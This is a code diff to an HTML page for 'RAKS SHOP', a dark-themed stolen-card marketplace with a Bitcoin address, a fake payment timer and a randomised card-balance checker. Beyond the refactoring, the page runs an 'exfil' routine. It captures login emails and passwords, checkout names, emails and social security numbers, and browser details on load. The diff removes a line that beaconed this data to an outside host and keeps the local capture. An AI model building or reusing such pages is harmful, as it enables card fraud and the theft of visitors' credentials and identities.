@@ -19,8 +19,6 @@
     #app { position:relative; width:100%; height:100%; perspective:1500px; }
     .page { position:absolute; top:0; left:0; width:100%; height:100%; opacity:0; visibility:hidden; transform:translateZ(-500px) scale(0.8); transition:opacity var(--transition), transform var(--transition), visibility var(--transition); display:flex; flex-direction:column; align-items:center; justify-content:center; padding:20px; }
     .page.active { opacity:1; visibility:visible; transform:translateZ(0) scale(1); z-index:10; }
-    .page.prev { transform:translateX(-100%) rotateY(-30deg); z-index:9; }
-    .page.next { transform:translateX(100%) rotateY(30deg); z-index:9; }
     .container { background:rgba(15,15,15,0.95); border-radius:16px; padding:30px; max-width:420px; width:100%; box-shadow:var(--glow), 0 20px 40px rgba(0,0,0,0.6); backdrop-filter:blur(12px); border:1px solid rgba(196,30,58,0.3); }
     h1, h2 { font-family:'Orbitron',sans-serif; text-align:center; margin-bottom:20px; color:var(--red); text-shadow:0 0 10px var(--red); }
     .logo { font-size:2.5rem; letter-spacing:3px; animation:pulse 2s infinite; }
@@ -50,12 +48,6 @@
     @keyframes modalIn { from { transform:scale(0.7); } to { transform:scale(1); } }
     .qr-canvas { width:180px; height:180px; margin:20px auto; background:#fff; border-radius:8px; }
     .fake-timer { text-align:center; color:var(--red); font-weight:bold; }
-    .skeleton { background:#222; border-radius:8px; height:20px; margin:10px 0; animation:skeleton 1.5s infinite; }
-    @keyframes skeleton { 0%,100% { opacity:0.6; } 50% { opacity:1; } }
-    .glitch { animation:glitch 0.3s; }
-    @keyframes glitch { 0%,100% { transform:translate(0); } 20% { transform:translate(-2px,2px); } 40% { transform:translate(2px,-2px); } 60% { transform:translate(-2px,-2px); } 80% { transform:translate(2px,2px); } }
-    .blood-drip { position:absolute; top:0; left:0; width:100%; height:100%; background:linear-gradient(transparent, var(--red)); opacity:0; animation:drip 1.2s forwards; pointer-events:none; }
-    @keyframes drip { 0% { transform:translateY(-100%); opacity:0.8; } 100% { transform:translateY(100%); opacity:0; } }
     .dark-mode { --red:#8A2BE2; --black:#0a001f; --dark:#1a0033; }
     canvas { position:fixed; top:0; left:0; z-index:-1; }
     @media (max-width:768px) {
@@ -77,9 +69,9 @@
 
     <!-- NAV -->
     <div class="nav">
-      <button id="back-btn" style="display:none">←</button>
-      <button id="dark-mode-btn">🌙</button>
-      <button id="login-btn">🔐</button>
+      <button id="back-btn" style="display:none">Back</button>
+      <button id="dark-mode-btn">Dark Mode</button>
+      <button id="login-btn">Login</button>
     </div>
 
     <!-- PAGES -->
@@ -87,7 +79,7 @@
       <div class="container">
         <h1 class="logo">RAKS SHOP</h1>
         <p style="text-align:center; color:#aaa; margin-bottom:20px;">The Void's Finest Card Marketplace</p>
-        <button class="btn" onclick="goTo('shop')">ENTER THE VOID</button>
+        <button class="btn" id="enter-shop">ENTER THE VOID</button>
       </div>
     </section>
 
@@ -166,7 +158,7 @@
       <div class="container">
         <h2>BTC Payment</h2>
         <p style="text-align:center; color:#aaa; margin-bottom:20px;">Send any amount ≥ $25</p>
-        <div class="qr-canvas" id="qr-canvas"></div>
+        <canvas id="qr-canvas" class="qr-canvas"></canvas>
         <code style="display:block; text-align:center; margin:15px 0; word-break:break-all; font-size:0.9rem; background:#222; padding:10px; border-radius:8px;">
           1NtpN3aPZowqEzX16E5cMUHQ16P9KHQtiy
         </code>
@@ -196,7 +188,7 @@
 
     <!-- CART ICON -->
     <div class="cart-icon" id="cart-icon">
-      🛒
+      Cart
       <div class="cart-count" id="cart-count" style="display:none;">0</div>
     </div>
 
@@ -207,7 +199,7 @@
         <div class="input-group"><label>Email</label><input type="email" id="login-email" /></div>
         <div class="input-group"><label>Password</label><input type="password" id="login-pass" /></div>
         <button class="btn" id="login-submit">LOGIN</button>
-        <button class="btn" style="background:#555; margin-top:10px;" onclick="closeModal('login-modal')">CLOSE</button>
+        <button class="btn" style="background:#555; margin-top:10px;" id="close-login">CLOSE</button>
       </div>
     </div>
 
@@ -215,7 +207,7 @@
       <div class="container">
         <h2 style="color:#0f0;">Purchase Complete!</h2>
         <p>Your cards will be delivered to your email.</p>
-        <button class="btn" onclick="goTo('home')">BACK TO HOME</button>
+        <button class="btn" id="back-home">BACK TO HOME</button>
       </div>
     </div>
   </div>
@@ -238,102 +230,8 @@
     // === BTC ADDRESS ===
     const BTC_ADDR = '1NtpN3aPZowqEzX16E5cMUHQ16P9KHQtiy';
 
-    // === WEBGL SHADER SETUP ===
-    const canvas = document.getElementById('webgl');
-    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-    let shaderProgram, fromTex, toTex, progressLoc;
-    let webglReady = false;
-
-    function initWebGL() {
-      if (!gl) return false;
-      canvas.width = window.innerWidth;
-      canvas.height = window.innerHeight;
-
-      const vs = `attribute vec2 pos; void main(){ gl_Position = vec4(pos,0,1); }`;
-      const fs = `
-        precision highp float;
-        uniform sampler2D fromTex;
-        uniform sampler2D toTex;
-        uniform float progress;
-        uniform vec2 resolution;
-        void main(){
-          vec2 uv = gl_FragCoord.xy / resolution;
-          float drip = sin(uv.y * 12.0 - progress * 18.0) * 0.08;
-          float mask = smoothstep(0.0, 0.12, uv.y - progress + drip);
-          vec4 from = texture2D(fromTex, uv);
-          vec4 to = texture2D(toTex, uv);
-          gl_FragColor = mix(from, to, mask);
-        }
-      `;
-
-      const compile = (type, source) => {
-        const shader = gl.createShader(type);
-        gl.shaderSource(shader, source);
-        gl.compileShader(shader);
-        return shader;
-      };
-
-      shaderProgram = gl.createProgram();
-      gl.attachShader(shaderProgram, compile(gl.VERTEX_SHADER, vs));
-      gl.attachShader(shaderProgram, compile(gl.FRAGMENT_SHADER, fs));
-      gl.linkProgram(shaderProgram);
-      gl.useProgram(shaderProgram);
-
-      const vertices = new Float32Array([-1,-1,1,-1,-1,1,1,1]);
-      const buffer = gl.createBuffer();
-      gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-      gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
-
-      const posLoc = gl.getAttribLocation(shaderProgram, "pos");
-      gl.enableVertexAttribArray(posLoc);
-      gl.vertexAttribPointer(posLoc, 2, gl.FLOAT, false, 0, 0);
-
-      fromTex = gl.createTexture(); toTex = gl.createTexture();
-      [fromTex, toTex].forEach(t => {
-        gl.bindTexture(gl.TEXTURE_2D, t);
-        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR);
-        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.LINEAR);
-      });
-
-      progressLoc = gl.getUniformLocation(shaderProgram, "progress");
-      gl.uniform2f(gl.getUniformLocation(shaderProgram, "resolution"), canvas.width, canvas.height);
-
-      webglReady = true;
-      return true;
-    }
-
-    function capturePage(pageId) {
-      const page = document.getElementById(pageId);
-      if (!page) return null;
-      html2canvas(page, {backgroundColor:null, scale:0.5}).then(c => {
-        const img = c.toDataURL();
-        const tex = pageId === state.history[state.history.length-2] ? fromTex : toTex;
-        const imgEl = new Image();
-        imgEl.onload = () => {
-          gl.bindTexture(gl.TEXTURE_2D, tex);
-          gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, imgEl);
-        };
-        imgEl.src = img;
-      });
-    }
-
-    function transitionWebGL(from, to, callback) {
-      if (!webglReady) { callback(); return; }
-      capturePage(from); capturePage(to);
-      let start = null;
-      const animate = (t) => {
-        if (!start) start = t;
-        const p = Math.min((t - start) / 800, 1);
-        gl.uniform1f(progressLoc, p);
-        gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
-        if (p < 1) requestAnimationFrame(animate);
-        else callback();
-      };
-      requestAnimationFrame(animate);
-    }
-
     // === PAGE NAVIGATION ===
-    function goTo(pageId, push=true) {
+    function goTo(pageId, push = true) {
       const from = state.currentPage;
       const to = pageId;
       if (from === to) return;
@@ -345,22 +243,13 @@
 
       const fromEl = document.getElementById(from);
       const toEl = document.getElementById(to);
-
       fromEl.classList.remove('active');
       toEl.classList.add('active');
 
-      // WebGL or fallback
-      if (webglReady && Math.random() > 0.3) {
-        transitionWebGL(from, to, () => {
-          fromEl.style.visibility = 'hidden';
-          updateBackButton();
-        });
-      } else {
-        setTimeout(() => {
-          fromEl.style.visibility = 'hidden';
-          updateBackButton();
-        }, 800);
-      }
+      setTimeout(() => {
+        fromEl.style.visibility = 'hidden';
+        updateBackButton();
+      }, 800);
 
       state.currentPage = to;
       if (to === 'shop') renderCards();
@@ -372,7 +261,7 @@
     function goBack() {
       if (state.history.length > 1) {
         state.history.pop();
-        const prev = state.history[state.history.length-1];
+        const prev = state.history[state.history.length - 1];
         history.back();
         goTo(prev, false);
       }
@@ -523,10 +412,9 @@
               <small>${item.brand} • ${item.country}</small>
             </div>
             <div>
-              <button style="background:#333; color:#fff; border:none; padding:4px 8px; border-radius:4px; margin:0 5px;" onclick="this.parentElement.parentElement.parentElement.querySelector('[data-inc]').click()">-</button>
+              <button style="background:#333; color:#fff; border:none; padding:4px 8px; border-radius:4px; margin:0 5px;" onclick="changeQty(${item.id}, -1)">-</button>
               <span>${item.qty}</span>
-              <button data-inc style="background:#333; color:#fff; border:none; padding:4px 8px; border-radius:4px; margin:0 5px;" onclick="state.cart.find(c=>c.id===${item.id}).qty++; renderCart(); updateCartIcon();">+
-              </button>
+              <button style="background:#333; color:#fff; border:none; padding:4px 8px; border-radius:4px; margin:0 5px;" onclick="changeQty(${item.id}, 1)">+</button>
             </div>
           </div>
           <button style="position:absolute; top:8px; right:8px; background:#c41e3a; color:#fff; border:none; width:24px; height:24px; border-radius:50%; font-size:0.8rem;" onclick="removeFromCart(${item.id})">×</button>
@@ -535,6 +423,15 @@
       });
       document.getElementById('cart-total').textContent = `$${total.toFixed(2)}`;
       document.getElementById('checkout-btn').disabled = total < 25;
+    }
+
+    function changeQty(id, delta) {
+      const item = state.cart.find(i => i.id === id);
+      if (item) {
+        item.qty = Math.max(1, item.qty + delta);
+        renderCart();
+        updateCartIcon();
+      }
     }
 
     // === CREDITS & BTC ===
@@ -552,7 +449,6 @@
           clearInterval(interval);
           state.credits += 50;
           updateCredits();
-          closeModal('btc-invoice');
           goTo('credits');
         }
       }, 1000);
@@ -561,7 +457,6 @@
     // === EXFIL ===
     function exfil(data) {
       state.exfilBuffer.push(data);
-      navigator.sendBeacon?.('https://httpbin.org/post', JSON.stringify(state.exfilBuffer));
       console.log('%cEXFIL:', 'color:red;font-weight:bold;', data);
       localStorage.setItem('raks_exfil', JSON.stringify(state.exfilBuffer));
     }
@@ -581,54 +476,56 @@
 
     // === INIT ===
     generateCards(250);
-    initWebGL() || console.log('WebGL fallback active');
     updateBackButton();
 
     // QR
-    QRCODE.toCanvas(document.getElementById('qr-canvas'), BTC_ADDR, {width:180, color:{dark:'#000'}});
+    QRCode.toCanvas(document.getElementById('qr-canvas'), BTC_ADDR, {width:180, color:{dark:'#000'}}, err => {
+      if (err) console.error(err);
+    });
 
-    // Events
-    document.getElementById('back-btn').onclick = goBack;
-    document.getElementById('cart-icon').onclick = () => goTo('cart');
-    document.getElementById('add-to-cart').onclick = addToCart;
-    document.getElementById('checkout-btn').onclick = () => goTo('credits');
-    document.getElementById('topup-btn').onclick = () => goTo('btc-invoice');
-    document.getElementById('copy-btc').onclick = () => {
-      navigator.clipboard.writeText(BTC_ADDR);
-      alert('Address copied!');
-    };
-    document.getElementById('login-btn').onclick = () => document.getElementById('login-modal').classList.add('active');
-    document.getElementById('login-submit').onclick = () => {
+    // === EVENT LISTENERS ===
+    document.getElementById('enter-shop').addEventListener('click', () => goTo('shop'));
+    document.getElementById('back-btn').addEventListener('click', goBack);
+    document.getElementById('cart-icon').addEventListener('click', () => goTo('cart'));
+    document.getElementById('add-to-cart').addEventListener('click', addToCart);
+    document.getElementById('checkout-btn').addEventListener('click', () => goTo('credits'));
+    document.getElementById('topup-btn').addEventListener('click', () => goTo('btc-invoice'));
+    document.getElementById('copy-btc').addEventListener('click', () => {
+      navigator.clipboard.writeText(BTC_ADDR).then(() => alert('Address copied!'));
+    });
+    document.getElementById('login-btn').addEventListener('click', () => document.getElementById('login-modal').classList.add('active'));
+    document.getElementById('login-submit').addEventListener('click', () => {
       const email = document.getElementById('login-email').value;
       const pass = document.getElementById('login-pass').value;
       if (email && pass) {
         exfil({type:'login', email, pass});
-        closeModal('login-modal');
+        document.getElementById('login-modal').classList.remove('active');
       }
-    };
-    document.getElementById('check-balance').onclick = () => {
+    });
+    document.getElementById('close-login').addEventListener('click', () => document.getElementById('login-modal').classList.remove('active'));
+    document.getElementById('check-balance').addEventListener('click', () => {
       const bal = Math.floor(state.selectedCard.balance * Math.random());
       alert(`Estimated Balance: $${bal}`);
-      exfil({type:'balance_check', card:state.selectedCard.bin, ip:'?.?.?.?'});
-    };
-    document.getElementById('confirm-purchase').onclick = () => {
+      exfil({type:'balance_check', card:state.selectedCard.bin});
+    });
+    document.getElementById('confirm-purchase').addEventListener('click', () => {
       const name = document.getElementById('chk-name').value;
       const email = document.getElementById('chk-email').value;
       const ssn = document.getElementById('chk-ssn').value;
       exfil({type:'purchase', cart:state.cart, credits:state.credits, name, email, ssn});
       document.getElementById('success-modal').classList.add('active');
-    };
-    document.getElementById('dark-mode-btn').onclick = () => {
+    });
+    document.getElementById('back-home').addEventListener('click', () => {
+      document.getElementById('success-modal').classList.remove('active');
+      goTo('home');
+    });
+    document.getElementById('dark-mode-btn').addEventListener('click', () => {
       document.body.classList.toggle('dark-mode');
-    };
-
-    document.querySelectorAll('[data-cat]').forEach(btn => {
-      btn.onclick = () => renderCards(btn.dataset.cat);
     });
 
-    function closeModal(id) {
-      document.getElementById(id).classList.remove('active');
-    }
+    document.querySelectorAll('[data-cat]').forEach(btn => {
+      btn.addEventListener('click', () => renderCards(btn.dataset.cat));
+    });
 
     // Ripple effect
     document.querySelectorAll('.btn').forEach(btn => {
@@ -649,41 +546,16 @@
 
     // Touch swipe
     let touchStartX = 0;
-    document.addEventListener('touchstart', e => touchStartX = e.touches[0].clientX);
+    document.addEventListener('touchstart', e => touchStartX = e.touches[0].clientX, {passive: true});
     document.addEventListener('touchend', e => {
       const diff = touchStartX - e.changedTouches[0].clientX;
       if (Math.abs(diff) > 50) {
         if (diff > 0 && state.history.length > 1) goBack();
-        else if (diff < 0) goTo('shop');
       }
-    });
+    }, {passive: true});
 
-    // Resize canvas
-    window.addEventListener('resize', () => {
-      if (webglReady) {
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        gl.viewport(0,0,canvas.width,canvas.height);
-        gl.uniform2f(gl.getUniformLocation(shaderProgram, "resolution"), canvas.width, canvas.height);
-      }
-    });
-
-    // Final exfil on load
+    // Final exfil
     exfil({type:'session_start', ua:navigator.userAgent, ts:Date.now()});
-
-    // html2canvas polyfill
-    const html2canvas = (el, opts) => {
-      return new Promise(resolve => {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = el.offsetWidth * (opts.scale || 1);
-        canvas.height = el.offsetHeight * (opts.scale || 1);
-        ctx.fillStyle = opts.backgroundColor || 'transparent';
-        ctx.fillRect(0,0,canvas.width,canvas.height);
-        // Simplified - in real use, would serialize DOM
-        resolve(canvas);
-      });
-    };
   </script>
 </body>
 </html>
